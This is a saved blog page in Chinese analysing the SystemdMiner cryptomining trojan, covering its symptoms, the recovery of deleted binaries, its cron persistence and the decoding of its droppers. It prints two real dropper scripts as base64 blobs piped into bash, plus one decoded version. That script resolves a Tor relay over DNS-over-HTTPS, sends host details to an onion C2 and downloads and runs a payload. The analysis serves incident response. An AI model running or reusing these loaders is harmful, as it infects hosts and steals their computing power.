@@ -1,0 +1,591 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="sanduo">
+  <meta name="keywords" content="">
+  <meta name="description" content="SystemdMiner 挖矿木马分析与处置  背景之前应急时捕获分析过一个挖矿样本，后续因为逆向功底太差就搁置了，最近带新人尝试重新分析这个样本，发现这个挖矿样本仍然存活，并且有了不少改进。以下截图是2021年11月6日捕获的样本并提交virustotal分析的结果，首次提交并且只有一个引擎提示风险，话不多说，直接进行分析。申明一点儿：事后，全网检索了一下，发现有部分内容和SystemdMine">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SystemdMiner 挖矿木马分析">
+<meta property="og:url" content="https://hksanduo.github.io/2021/11/08/2021-11-08-systemd-miner-analysis/index.html">
+<meta property="og:site_name" content="sanduo blog">
+<meta property="og:description" content="SystemdMiner 挖矿木马分析与处置  背景之前应急时捕获分析过一个挖矿样本，后续因为逆向功底太差就搁置了，最近带新人尝试重新分析这个样本，发现这个挖矿样本仍然存活，并且有了不少改进。以下截图是2021年11月6日捕获的样本并提交virustotal分析的结果，首次提交并且只有一个引擎提示风险，话不多说，直接进行分析。申明一点儿：事后，全网检索了一下，发现有部分内容和SystemdMine">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hksanduo.github.io/img/20211108-01.png">
+<meta property="og:image" content="https://hksanduo.github.io/img/20211108-02.png">
+<meta property="og:image" content="https://hksanduo.github.io/img/20211108-03.png">
+<meta property="og:image" content="https://hksanduo.github.io/img/20211108-04.png">
+<meta property="og:image" content="https://hksanduo.github.io/img/20211108-05.png">
+<meta property="og:image" content="https://hksanduo.github.io/img/20211108-07.png">
+<meta property="og:image" content="https://hksanduo.github.io/img/20211108-08.png">
+<meta property="og:image" content="https://hksanduo.github.io/img/20211108-09.png">
+<meta property="og:image" content="https://hksanduo.github.io/img/20211108-10.png">
+<meta property="og:image" content="https://hksanduo.github.io/img/20211108-11.png">
+<meta property="og:image" content="https://hksanduo.github.io/img/20211108-12.png">
+<meta property="og:image" content="https://hksanduo.github.io/img/20211108-13.png">
+<meta property="og:image" content="https://hksanduo.github.io/img/20211108-14.png">
+<meta property="og:image" content="https://hksanduo.github.io/img/20211108-15.png">
+<meta property="og:image" content="https://hksanduo.github.io/img/20211108-16.png">
+<meta property="og:image" content="https://hksanduo.github.io/img/20211108-17.png">
+<meta property="og:image" content="https://hksanduo.github.io/img/20211108-18.png">
+<meta property="og:image" content="https://hksanduo.github.io/img/20211108-19.png">
+<meta property="og:image" content="https://hksanduo.github.io/img/20211108-20.png">
+<meta property="og:image" content="https://hksanduo.github.io/img/20211108-21.png">
+<meta property="og:image" content="https://hksanduo.github.io/img/20211108-22.png">
+<meta property="og:image" content="https://hksanduo.github.io/img/20211108-23.png">
+<meta property="article:published_time" content="2021-11-08T08:54:00.000Z">
+<meta property="article:modified_time" content="2025-01-18T14:54:10.080Z">
+<meta property="article:author" content="sanduo">
+<meta property="article:tag" content="Trojan">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://hksanduo.github.io/img/20211108-01.png">
+  
+  <title>SystemdMiner 挖矿木马分析 - sanduo blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"hksanduo.github.io","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":"UA-167858469-1","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Welcome To Sanduo&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="SystemdMiner 挖矿木马分析">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-11-08 08:54" pubdate>
+        2021年11月8日 早上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      8.4k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      26 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SystemdMiner 挖矿木马分析</h1>
+            
+            <div class="markdown-body">
+              <p>SystemdMiner 挖矿木马分析与处置</p>
+<hr>
+<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>之前应急时捕获分析过一个挖矿样本，后续因为逆向功底太差就搁置了，最近带新人尝试重新分析这个样本，发现这个挖矿样本仍然存活，并且有了不少改进。以下截图是2021年11月6日捕获的样本并提交virustotal分析的结果，首次提交并且只有一个引擎提示风险，话不多说，直接进行分析。<br><img src="/img/20211108-01.png" srcset="/img/loading.gif" lazyload alt="20211108-01.png"><br>申明一点儿：事后，全网检索了一下，发现有部分内容和SystemdMiner是有关联的，部分文章将发现的相关样本称为SystemdMiner挖矿木马，该样本我在19年12月首次捕获并进行分析，当时由于脚本伪装成aliyun.sh，我尚未起名，以标题为《一个名叫aliyun的挖矿木马处理过程》进行分析和通报，深信服的一篇分析文章的概述写到：</p>
+<blockquote>
+<p>最近，深信服安全团队捕获到SystemdMiner挖矿木马最新变种，该家族在2019年被首次发现，起初因其组件都以systemd-<XXX>命名而得名，但慢慢的，它们开始弃用systemd的命名形式，改为了随机名。<br>我又全网检索了一下，感觉和大名鼎鼎的SystemdMiner挖矿木马差别不少，具体对比参考360 netlab的分析文章，我感觉我之前捕获的样本和大名鼎鼎的SystemdMiner家族挖矿木马差别很大，只是部分功能有借鉴。本人非一线安全研究人员，此处是个人观点，没必要上纲上线。为了方便称呼，以下均称为：SystemdMiner挖矿木马。</p>
+</blockquote>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h3><p>挖矿现象很明显，直接把我这个小破本的CPU性能压榨的一滴不剩。<br><img src="/img/20211108-02.png" srcset="/img/loading.gif" lazyload alt="20211108-02.png"><br>想都不用想，如果直接杀掉挖矿进程稍等片刻就会有另一个随机命名的挖矿进程继续运行，继续压榨我这个小破本。对于中招的用户，可以先kill掉挖矿进程，然后再系统的处置入侵相关事宜。</p>
+<h3 id="提取样本"><a href="#提取样本" class="headerlink" title="提取样本"></a>提取样本</h3><h4 id="挖矿进程"><a href="#挖矿进程" class="headerlink" title="挖矿进程"></a>挖矿进程</h4><p>挖矿的进程是23632，查看该进程相关信息，进入&#x2F;proc&#x2F;23632目录，运行文件已删除。<br><img src="/img/20211108-03.png" srcset="/img/loading.gif" lazyload alt="20211108-03.png"><br>&#x2F;proc&#x2F;23632&#x2F;fd目录下发现关联的一些文件信息<br><img src="/img/20211108-04.png" srcset="/img/loading.gif" lazyload alt="20211108-04.png"><br>如果看过之前分析的第一篇文章，对 &#x2F;tmp&#x2F;.X11-unix&#x2F;目录文件应该不陌生，里面的文件存储着远控和挖矿进程id信息。<br><img src="/img/20211108-05.png" srcset="/img/loading.gif" lazyload alt="20211108-05.png"></p>
+<p>我们先将已删除的文件提取出来<br><img src="/img/20211108-07.png" srcset="/img/loading.gif" lazyload alt="20211108-07.png"></p>
+<p>提交到virustotal分析，发现几天前应该是有人中招了。<br><img src="/img/20211108-08.png" srcset="/img/loading.gif" lazyload alt="20211108-08.png"></p>
+<h4 id="远控"><a href="#远控" class="headerlink" title="远控"></a>远控</h4><p>接下来轻车熟路，进入&#x2F;tmp&#x2F;.X11-unix&#x2F;，查看其他进程信息。<br><img src="/img/20211108-09.png" srcset="/img/loading.gif" lazyload alt="20211108-09.png"><br>其中名为22的文件内容为空，不清楚原因，出了挖矿的，另一个名为01的文件，应该存储着远控的进程id，这里是22545。<br><img src="/img/20211108-10.png" srcset="/img/loading.gif" lazyload alt="20211108-10.png"><br>同样的配方，导出远控的进程<br><img src="/img/20211108-11.png" srcset="/img/loading.gif" lazyload alt="20211108-11.png"></p>
+<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>通过仔细查找，发现root目录下存在两个可疑文件：<br><img src="/img/20211108-12.png" srcset="/img/loading.gif" lazyload alt="20211108-12.png"></p>
+<ul>
+<li>.systemd-private-a7sebNyLZedpFNW6SxqOF2F7ggZv2te.sh</li>
+<li>.unixdb.sh</li>
+</ul>
+<p>.systemd-private-a7sebNyLZedpFNW6SxqOF2F7ggZv2te.sh脚本内容如下：<br><img src="/img/20211108-13.png" srcset="/img/loading.gif" lazyload alt="20211108-13.png"><br>文本内容如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"> <span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">exec</span> &amp;&gt;/dev/null<br><span class="hljs-built_in">echo</span> a7sebNyLZedpFNW6SxqOF2F7ggZv2te<br><span class="hljs-built_in">echo</span> YTdzZWJOeUxaZWRwRk5XNlN4cU9GMkY3Z2dadjJ0ZQpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJtaGV2a2s0b2RnenFwdDJoYmozaGh3MnV6NHZodW5vbzU1ZXZld3JnbW91eWllaGNhbHRtYnJxZCIpCgpzb2NreigpIHsKbj0oZG5zLmRpZ2l0YWxlLWdlc2VsbHNjaGFmdC5jaCBkb2gubGkgZG9oLnB1YiBmaS5kb2guZG5zLnNub3B5dGEub3JnIGh5ZHJhLnBsYW45LW5zMS5jb20gcmVzb2x2ZXItZXUubGVsdXguZmkgZG5zLmhvc3R1eC5uZXQgZG5zLnR3bmljLnR3IGRvaC1maS5ibGFoZG5zLmNvbSBmaS5kb2guZG5zLnNub3B5dGEub3JnIHJlc29sdmVyLWV1LmxlbHV4LmZpIGRvaC5saSBkbnMuZGlnaXRhbGUtZ2VzZWxsc2NoYWZ0LmNoKQpwPSQoZWNobyAiZG5zLXF1ZXJ5P25hbWU9cmVsYXkudG9yMnNvY2tzLmluIikKcT0ke25bJCgoUkFORE9NJSR7I25bQF19KSldfQpzPSQoJGMgaHR0cHM6Ly8kcS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8Z3JlcCAtRXYgWy5dMHxzb3J0IC11Unx0YWlsIC0xKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAuICRIT01FIC91c3IvYmluICRkIC92YXIvdG1wIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaXQKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCmZleGU7dSAkdC4kaApscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvdG1wO3UgJHQuJGgpCmxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXMgfHwgKGNkIC9kZXYvc2htO3UgJHQuJGgpCmVsc2UKYnJlYWsKZmkKZG9uZQo=|<span class="hljs-built_in">base64</span> -d|bash<br></code></pre></td></tr></table></figure>
+<p>.unixdb.sh内容如下：<br><img src="/img/20211108-14.png" srcset="/img/loading.gif" lazyload alt="20211108-14.png"><br>文本内容如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">exec</span> &amp;&gt;/dev/null<br><span class="hljs-built_in">echo</span> yyANhZDFOs31F9WgqOovurruEMT3Z+v82MG0m9elafh8GU1+u4/78NZoKz2rA7O2<br><span class="hljs-built_in">echo</span> eXlBTmhaREZPczMxRjlXZ3FPb3Z1cnJ1RU1UM1ordjgyTUcwbTllbGFmaDhHVTErdTQvNzhOWm9LejJyQTdPMgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJ1bml4ZGJudWFkeG13dG9iIikKCnNvY2t6KCkgewpuPShkbnMudHduaWMudHcgZG9oLmNlbnRyYWxldS5waS1kbnMuY29tIGRvaC5kbnMuc2IgZG9oLWZpLmJsYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgdW5jZW5zb3JlZC5hbnkuZG5zLm5peG5ldC54eXopCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTUpKV19LyRwIHwgZ3JlcCAtb0UgIlxiKFswLTldezEsM31cLil7M31bMC05XXsxLDN9XGIiIHx0ciAnICcgJ1xuJ3xzb3J0IC11UnxoZWFkIC0xKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAkZCAvdG1wIC92YXIvdG1wIC9kZXYvc2htIC91c3IvYmluIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmZXhlCmY9L2ludC4kKHVuYW1lIC1tKQp4PS4vJChkYXRlfG1kNXN1bXxjdXQgLWYxIC1kLSkKJGMgLXggc29ja3M1aDovLyRzOjkwNTAgJHQub25pb24kZiAtbyR4IHx8ICRjICQxJGYgLW8keApjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuY2ggdG9yMndlYi5pbyB0b3Iyd2ViLnRvIHRvcjJ3ZWIuc3UKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLTEgL3RtcC8uWDExLXVuaXgvMDApL3N0YXR1czsgdGhlbgp1ICR0LiRoCmVsc2UKYnJlYWsKZmkKZG9uZQo=|<span class="hljs-built_in">base64</span> -d|bash<br></code></pre></td></tr></table></figure>
+<p>通过查看定时任务，发现两个定时任务，一明一暗，熟悉的配方，熟悉的味道：<br><img src="/img/20211108-15.png" srcset="/img/loading.gif" lazyload alt="20211108-15.png"><br><img src="/img/20211108-16.png" srcset="/img/loading.gif" lazyload alt="20211108-16.png"><br>另一个定时任务运行的脚本位于&#x2F;opt目录下，内容和 .systemd-private-a7sebNyLZedpFNW6SxqOF2F7ggZv2te.sh相同，</p>
+<p>到这里相关的文件大概收集的差不多了，接下来杀掉相关进程，先尝试分析一下。<br><img src="/img/20211108-17.png" srcset="/img/loading.gif" lazyload alt="20211108-17.png"></p>
+<h3 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h3><p>首先先分析两个运行脚本，.systemd-private-a7sebNyLZedpFNW6SxqOF2F7ggZv2te.sh base64 解码以后的内容为：<br><img src="/img/20211108-18.png" srcset="/img/loading.gif" lazyload alt="20211108-18.png"><br><img src="/img/20211108-19.png" srcset="/img/loading.gif" lazyload alt="20211108-19.png"><br>格式化以后的代码为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> &amp;&gt;/dev/null<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:<span class="hljs-variable">$HOME</span>:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin<br><br>d=$(grep x:$(<span class="hljs-built_in">id</span> -u): /etc/passwd | <span class="hljs-built_in">cut</span> -d: -f6)<br>c=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;curl -4fsSLkA- -m200&quot;</span>)<br>t=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;mhevkk4odgzqpt2hbj3hhw2uz4vhunoo55evewrgmouyiehcaltmbrqd&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-title">sockz</span></span>() &#123;<br>	n=(dns.digitale-gesellschaft.ch doh.li doh.pub fi.doh.dns.snopyta.org hydra.plan9-ns1.com resolver-eu.lelux.fi dns.hostux.net dns.twnic.tw doh-fi.blahdns.com fi.doh.dns.snopyta.org resolver-eu.lelux.fi doh.li dns.digitale-gesellschaft.ch)<br>	p=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;dns-query?name=relay.tor2socks.in&quot;</span>)<br>	q=<span class="hljs-variable">$&#123;n[$((RANDOM % <span class="hljs-variable">$&#123;#n[@]&#125;</span>))]&#125;</span><br>	s=$(<span class="hljs-variable">$c</span> https://<span class="hljs-variable">$q</span>/<span class="hljs-variable">$p</span> | grep -oE <span class="hljs-string">&quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot;</span> | <span class="hljs-built_in">tr</span> <span class="hljs-string">&#x27; &#x27;</span> <span class="hljs-string">&#x27;\n&#x27;</span> | grep -Ev [.]0 | <span class="hljs-built_in">sort</span> -uR | <span class="hljs-built_in">tail</span> -1)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">fexe</span></span>() &#123;<br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> . <span class="hljs-variable">$HOME</span> /usr/bin <span class="hljs-variable">$d</span> /var/tmp; <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-built_in">exit</span> &gt;<span class="hljs-variable">$i</span>/i &amp;&amp; <span class="hljs-built_in">chmod</span> +x <span class="hljs-variable">$i</span>/i &amp;&amp; <span class="hljs-built_in">cd</span> <span class="hljs-variable">$i</span> &amp;&amp; ./i &amp;&amp; <span class="hljs-built_in">rm</span> -f i &amp;&amp; <span class="hljs-built_in">break</span>; <span class="hljs-keyword">done</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">u</span></span>() &#123;<br>	sockz<br>	f=/int.$(<span class="hljs-built_in">uname</span> -m)<br>	x=./$(<span class="hljs-built_in">date</span> | <span class="hljs-built_in">md5sum</span> | <span class="hljs-built_in">cut</span> -f1 -d-)<br>	r=$(curl -4fsSLk checkip.amazonaws.com || curl -4fsSLk ip.sb)_$(<span class="hljs-built_in">whoami</span>)_$(<span class="hljs-built_in">uname</span> -m)_$(<span class="hljs-built_in">uname</span> -n)_$(ip a | grep <span class="hljs-string">&#x27;inet &#x27;</span> | awk &#123;<span class="hljs-string">&#x27;print $2&#x27;</span>&#125; | <span class="hljs-built_in">md5sum</span> | awk &#123;<span class="hljs-string">&#x27;print $1&#x27;</span>&#125;)_$(crontab -l | <span class="hljs-built_in">base64</span> -w0)<br>	<span class="hljs-variable">$c</span> -x socks5h://<span class="hljs-variable">$s</span>:9050 <span class="hljs-variable">$t</span>.onion<span class="hljs-variable">$f</span> -o<span class="hljs-variable">$x</span> -e<span class="hljs-variable">$r</span> || <span class="hljs-variable">$c</span> $1<span class="hljs-variable">$f</span> -o<span class="hljs-variable">$x</span> -e<span class="hljs-variable">$r</span><br>	<span class="hljs-built_in">chmod</span> +x <span class="hljs-variable">$x</span><br>	<span class="hljs-variable">$x</span><br>	<span class="hljs-built_in">rm</span> -f <span class="hljs-variable">$x</span><br>&#125;<br><br><span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> tor2web.in tor2web.it; <span class="hljs-keyword">do</span><br>	<span class="hljs-keyword">if</span> ! <span class="hljs-built_in">ls</span> /proc/$(<span class="hljs-built_in">head</span> -n 1 /tmp/.X11-unix/01)/status; <span class="hljs-keyword">then</span><br>		fexe<br>		u <span class="hljs-variable">$t</span>.<span class="hljs-variable">$h</span><br>		<span class="hljs-built_in">ls</span> /proc/$(<span class="hljs-built_in">head</span> -n 1 /tmp/.X11-unix/01)/status || (<br>			<span class="hljs-built_in">cd</span> /tmp<br>			u <span class="hljs-variable">$t</span>.<span class="hljs-variable">$h</span><br>		)<br>		<span class="hljs-built_in">ls</span> /proc/$(<span class="hljs-built_in">head</span> -n 1 /tmp/.X11-unix/01)/status || (<br>			<span class="hljs-built_in">cd</span> /dev/shm<br>			u <span class="hljs-variable">$t</span>.<span class="hljs-variable">$h</span><br>		)<br>	<span class="hljs-keyword">else</span><br>		<span class="hljs-built_in">break</span><br>	<span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+<p>分析：<br>随机找个公共DNS服务器解析域名relay.tor2socks.in，主要目的是通过Https加密DNS查询结果，绕过了IDS等安全设备IOCS恶意域名检测，下载远控，提交主机信息并运行，这里有点儿聪明，通过socket5的方式用relay.tor2socks.in代理访问C&amp;C域名， 解决了大部分设备无法访问洋葱网络的问题。也可以直接通过tor2web服务访问C&amp;C主机。<br><img src="/img/20211108-20.png" srcset="/img/loading.gif" lazyload alt="20211108-20.png"></p>
+<p>unixdb.sh 脚本文件大同小异，就是一个精简版的.systemd-private-a7sebNyLZedpFNW6SxqOF2F7ggZv2te.sh C&amp;C服务器和dns的查询地址有些许变化。</p>
+<p>int.x86_64文件分析<br>使用IDA反汇编，毫无疑问，正常加壳操作，尝试脱壳。<br><img src="/img/20211108-21.png" srcset="/img/loading.gif" lazyload alt="20211108-21.png"></p>
+<p>远程调试，应该是程序设置了反调试，使用gdb也没法调试，尝试简单的绕过，发现并不能成功，这块触及到我能力的盲区了，19年不会逆向，后来勉强通过远程调试，找到了4个shell脚本，今天又遇到了当初的难题，又困在了逆向分析上面，吐一口老血。<br><img src="/img/20211108-22.png" srcset="/img/loading.gif" lazyload alt="20211108-22.png"><br><img src="/img/20211108-23.png" srcset="/img/loading.gif" lazyload alt="20211108-23.png"></p>
